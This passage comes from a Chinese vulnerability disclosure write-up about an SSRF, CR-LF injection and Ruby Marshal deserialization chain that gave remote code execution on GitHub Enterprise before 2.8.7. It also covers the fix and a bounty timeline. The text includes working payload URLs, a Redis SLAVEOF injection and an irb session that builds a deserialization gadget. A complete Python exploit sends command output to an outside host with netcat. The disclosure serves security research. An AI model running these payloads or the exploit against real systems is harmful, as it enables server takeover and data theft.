    http://0:8000/composer/send_email?
    to=orange@nogg&
    url=http://127.0.0.1:12345/%0D%0Ai_am_payload%0D%0AFoo:
    $ nc -vvlp 12345
    ...
    GET /
    i_am_payload
    Foo: HTTP/1.1
    Host: 127.0.0.1:12345
    Accept-Encoding: identity
虽然这看起来我们貌似只前进了一小步，但对于整个漏洞利用链来说却是非常大的进步。现在，我已经可以在这个SSRF漏洞执行链中引入其他的协议了。比如说，如果我想对其中的Redis动手，我们就可以尝试使用下列Payload：
    http://0:8000/composer/send_email?
    to=orange@nogg&
    url=http://127.0.0.1:6379/%0ASLAVEOF%20orange.tw%206379%0A
注:Redis的slaveof命令可以允许我们使用带外数据，当你用户到某些Blind-SSRF时这种技巧是非常实用的。
不过，在可利用的协议方面还是存在有很多的限制：
1.像SSH、MySQL和SSL这种需要进行握手的协议将会失效；
2.由于Python2的原因，我们在第二个SSRF中所使用的Payload只允许0x00到0x8F字节的数据。
顺便提一下，我们还有很多利用HTTP协议的方法。在我的演讲幻灯片中，我还演示了如何使用Linux
Glibc来修改SSL协议。除此之外，你也可以参考漏洞CVE-2016-5699！如果你感兴趣的话…
**第四个漏洞-不安全的反序列化**
目前为止，我们已经能够在HTTP协议中利用其他的协议或嵌入Payload了，但是接下来的问题就是，我应该选择哪一个协议呢？如果我能够控制Redis或Memcached的话，我能够触发哪一个漏洞呢？
我花了很多时间来弄清楚上面这些问题，在检查相关源代码的过程中，我比较想知道GitHub为什么会在Memcached中存储Ruby对象。在研究了一阵子之后，我发现GitHub
Enterprise使用RubyGem
mecached来处理缓存，而缓存的封装是通过Marshal实现的。这就非常棒了，因为所有人都知道Marshal是非常危险的，所以我们接下来的目标就非常清晰了。
我准备使用之前的SSRF漏洞执行链在Memcached中存储恶意Ruby对象。当GitHub下一次获取缓存时，RubyGem
memcached将会自动对数据进行反序列化操作，而结果就是…要爆炸！！因为我们在GitHub上实现了远程代码执行（RCE）。
Rails控制台中不安全的Marshal：
    irb(main):001:0> GitHub.cache.class.superclass
    => Memcached::Rails
    irb(main):002:0> GitHub.cache.set("nogg", "hihihi")
    => true
    irb(main):003:0> GitHub.cache.get("nogg")
    => "hihihi"
    irb(main):004:0> GitHub.cache.get("nogg", :raw=>true)
    => "x04bI"vhihihix06:x06ET"
    irb(main):005:0> code = "`id`"
    => "`id`"
    irb(main):006:0> payload = "x04x08" + "o"+":x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy"+"x07" + ":x0E@instance" + "o"+":x08ERB"+"x07" + ":x09@src" + Marshal.dump(code)[2..-1] + ":x0c@lineno"+ "ix00" + ":x0C@method"+":x0Bresult"
    =>
    "u0004bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxya:u000E@instanceo:bERBa:t@srcI"t`id`u0006:u0006ET:f@linenoiu0000:f@method:vresult"
    irb(main):007:0> GitHub.cache.set("nogg", payload, 60, :raw=>true)
    => true
    irb(main):008:0> GitHub.cache.get("nogg")
    => "uid=0(root) gid=0(root) groups=0(root)n"
没错，就是这样。现在我们重新梳理一下整个过程：
1.第一个SSRF漏洞，可以绕过WebHook中现有的保护机制。
2.第二个SSRF漏洞，存在于Graphite服务之中。
3.结合第一个和第二个SSRF漏洞，组成SSRF漏洞执行链。
4.SSRF执行链中的CR-LF注入。
5.利用Memcached协议，注入恶意Marshal对象。
6.触发远程代码执行。
**漏洞利用代码**
    #!/usr/bin/python
     from urllib import quote
       ''' set up the marshal payload from IRB
     code = "`id | nc orange.tw 12345`"
     p "x04x08" + "o"+":x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy"+"x07" + ":x0E@instance" + "o"+":x08ERB"+"x07" + ":x09@src" + Marshal.dump(code)[2..-1] + ":x0c@lineno"+ "ix00" + ":x0C@method"+":x0Bresult"
     '''
     marshal_code = 'x04x08o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxyx07:x0e@instanceo:x08ERBx07:t@srcI"x1e`id | nc orange.tw 12345`x06:x06ET:x0c@linenoix00:x0c@method:x0bresult'
       payload = [
     '',
     'set githubproductionsearch/queries/code_query:857be82362ba02525cef496458ffb09cf30f6256:v3:count 0 60 %d' % len(marshal_code),
     marshal_code,
     '',
     ''
     ]
       payload = map(quote, payload)
     url = 'http://0:8000/composer/send_email?to=PI:EMAIL&url=http://127.0.0.1:11211/'
       print "nGitHub Enterprise < 2.8.7 Remote Code Execution by PI:EMAIL"
     print '-'*10 + 'n'
     print url + '%0D%0A'.join(payload)
     print '''
     Inserting WebHooks from:
     https://ghe-server/:user/:repo/settings/hooks
       Triggering RCE from:
     https://ghe-server/search?q=ggggg&type=Repositories
     '''
**漏洞修复**
GitHub采取了以下措施来防止相关问题再次发生，并提升了网站安全性：
1.增强了Gem faraday-restrict-ip-addresses；
2.采用了自定义的Django中间件来确保攻击者无法从外部访问http://127.0.0.1:8000/render/；
3.增强了iptables规则；
    $ cat /etc/ufw/before.rules
    ...
    -A ufw-before-input -m multiport -p tcp ! --dports 22,23,80,81,122,123,443,444,8080,8081,8443,8444 -m recent --tcp-flags PSH,ACK PSH,ACK --remove -m string --algo bm --string "User-Agent: GitHub-Hookshot" -j REJECT --reject-with tcp-reset
    ...
**时间轴**
2017年01月23日23:22：通过HackerOne将漏洞上报给GitHub，报告编号为200542；
2017年01月23日23:37：GitHub将报告状态修改为已分类；
2017年01月24日04:43：GitHub确认了漏洞，并表示正在修复相关问题；
2017年01月31日14:01：GitHub Enterprise 2.8.7发布；
2017年02月01日01:02：GitHub回复称漏洞已成功修复；
2017年02月01日01:02：GitHub提供了7500美刀的漏洞奖金；
2017年03月15日02:38：GitHub又提供了5000美金的年度最佳漏洞报告奖励；